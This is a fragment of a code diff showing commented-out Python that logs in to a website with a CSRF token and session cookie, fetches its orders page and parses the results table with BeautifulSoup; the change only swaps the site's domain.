 #         if b'Login or password are incorrect' in response.content:
 #             print("Error: Login failed")
 #         else:
@@ -719,10 +1011,10 @@ def loginreq(request):
 #                 headers = {
 #                     "X-CSRFToken": csrf_token,
 #                     "Cookie": f"sessionid={session.cookies['sessionid']}",
-#                     "Referer": "https://bclub.cm/login/",
+#                     "Referer": "https://bclub.mp/login/",
 #                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
 #                 }
-#                 response3 = session.get('https://bclub.cm/orders/', headers=headers)
+#                 response3 = session.get('https://bclub.mp/orders/', headers=headers)
 #                 print('response3',response3.status_code)
 #                 soup = BeautifulSoup(response3.content, 'html.parser')
 #                 table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
